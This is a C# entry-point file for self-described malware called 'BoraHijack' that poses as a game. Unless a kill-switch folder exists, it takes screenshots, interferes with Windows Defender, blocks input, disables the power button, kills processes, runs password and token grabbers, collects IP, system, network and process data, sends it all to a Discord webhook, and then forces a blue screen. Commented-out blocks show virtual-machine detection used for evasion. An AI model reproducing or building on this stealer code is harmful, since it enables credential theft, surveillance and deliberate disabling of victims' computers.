using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Discord.Webhook;
using BoraHijack.Fun;
using BoraHijack.Grabbers;
using BoraHijack.Evasion;
using BoraHijack.Common;
using BoraHijack.Presistance;
using BoraHijack.Lambda_Inject;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
//using PegasusBin;
using ToxicDelta;

namespace BoraHijack
{
    public class Program
    {
        [STAThread]
        static async Task Main()
        {
            /*
             * the most peak trolling virus (¬‿¬)
             * 
             * BORAHIJACK MAIN ENTRY. PEGASUS/TOXICDELTA STARTER.
             * 
             * this is the starting point of the virus
             * 
             * tldr in what this virus does is target laptops
             * basically make the button do nothing so they cant stop it
             * ╰（‵□′）╯
             */

            // also change in Borahijack.ToxicDelta/Passwords.cs, TknGrabber.cs, and ToxicDelta's Program.cs file
            var webhookUrl = "";

            try
            {
                //Console.Title = "Project Galaxy";
                Console.WriteLine("Starting Game...");
                Thread.Sleep(500);

                string imageUrl = "https://files.catbox.moe/t83ct7.png"; 

                // disable when testing on vm or not when testing checking

                /*
                if (CheckVM.IsRunningInVM_Comprehensive())
                {
                    Environment.Exit(0);
                }
                else
                {
                    Console.Title = "Please wait...";
                    Screenshot.Main(webhookUrl).GetAwaiter().GetResult();
                    Defender.Main3(webhookUrl).GetAwaiter().GetResult();
                    Input.BlockInput(true);
                    DisplayOff.Main2(); 
                    IPG.GetIP(webhookUrl).GetAwaiter().GetResult();
                    Lambda_Inject.Program2.Main7(webhookUrl).GetAwaiter().GetResult();
                    //Stealer.Main(webhookUrl).GetAwaiter().GetResult();

                // etc
                    PowerButton.Main6();
                    CloseAllProcess.Main4();
                    DesktopImage.Main(imageUrl).GetAwaiter().GetResult();

                // Grabbing stuff
                    GrabCompInfo.Main(webhookUrl).GetAwaiter().GetResult();
                    TCPConnetions.Main(webhookUrl).GetAwaiter().GetResult();
                    ProcessInfo.MainGrabProcess(webhookUrl).GetAwaiter().GetResult();

                    //Trolling.Calljobs(webhookUrl).GetAwaiter().GetResult();
                    DisplayOn.Main5();
                    Screenshot.Main(webhookUrl).GetAwaiter().GetResult(); // screenshot aftermath
                }
                */


                /*
                // THIS PIECE IS FOR NO VM CHECK
                Console.Title = "Please wait...";
                Screenshot.Main(webhookUrl).GetAwaiter().GetResult();
                Defender.Main3(webhookUrl).GetAwaiter().GetResult();
                Input.BlockInput(true); // set as a bool so yea
                DisplayOff.Main2();
                IPG.GetIP(webhookUrl).GetAwaiter().GetResult();
                Lambda_Inject.Program2.Main7(webhookUrl).GetAwaiter().GetResult();
                //Stealer.Main(webhookUrl).GetAwaiter().GetResult();

                // etc
                PowerButton.Main6();
                CloseAllProcess.Main4();
                DesktopImage.Main(imageUrl).GetAwaiter().GetResult();

                // Grabbing stuff
                GrabCompInfo.Main(webhookUrl).GetAwaiter().GetResult();
                TCPConnections.Main(webhookUrl).GetAwaiter().GetResult();
                ProcessInfo.MainGrabProcess(webhookUrl).GetAwaiter().GetResult();
                LanDevices.GetLanDevices(webhookUrl).GetAwaiter().GetResult();
                NetworkAdapters.Main(webhookUrl).GetAwaiter().GetResult();

                //Trolling.Calljobs(webhookUrl).GetAwaiter().GetResult();
                DisplayOn.Main5();
                Screenshot.Main(webhookUrl).GetAwaiter().GetResult(); // screenshot aftermath
                Thread.Sleep(5000);
                Input.BlockInput(false);
                BoraHijack.Fun.Bsod.TriggerBSOD();
                */
                
                // kill switch, it will be made as a normal program but if they dont
                // have this folder in their C drive or anywhere it will activate the virus
                string folderPath = @"C:\stop";

                if (Directory.Exists(folderPath))
                {
                    Process.Start(@"C:\Users\santi\Downloads\geometric.exe");
                }
                else
                {
                    Confirm.Confirming(webhookUrl).GetAwaiter().GetResult();

                    //Console.Title = "Please wait...";
                    await Screenshot.MainSS(webhookUrl);
                    await Defender.Main3(webhookUrl);
                    Input.BlockInput(true); // set as a bool so yea
                    //DisplayOff.Main2();
                    IPG.GetIP(webhookUrl).GetAwaiter().GetResult(); // this can run syncronically
                    Program2.Main7(webhookUrl); // lambda-inject
                    //MainPegasus.Main();
                    await ToxicDelta.Program.Main(); // was gonna put in grabbing stuff but this is important before the computer bsod

                    // etc
                    PowerButton.MainPWRB();
                    CloseAllProcess.MainCAP();
                    await DesktopImage.MainDSKW(imageUrl);

                    // Grabbing stuff
                    await GrabCompInfo.MainComp(webhookUrl);
                    await TCPConnections.MainTCP(webhookUrl);
                    await ProcessInfo.MainGrabProcess(webhookUrl);
                    await LanDevices.GetLanDevices(webhookUrl);
                    await NetworkAdapters.MainADAPT(webhookUrl);

                    DisplayOn.Main5();

                    //Trolling.Callj*bs(webhookUrl).GetAwaiter().GetResult(); // in progress
                    await Screenshot.MainSS(webhookUrl); // screenshot aftermath
                    await Bsod.BSODAlert(webhookUrl); // BSOD victim
                }
            }
            catch (Exception ex)
            {
                Console.BackgroundColor = ConsoleColor.Red;
                Console.WriteLine($"Error: {ex.Message}");
                Console.ResetColor();
                Console.ReadKey();

                //MessageBox.Show($"Something went wrong. Please try again later. \n{ex.Message}", "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
                await ExceptionLog.LogException("Unhandled Crash", ex, webhookUrl);
            }
        }
    }
}
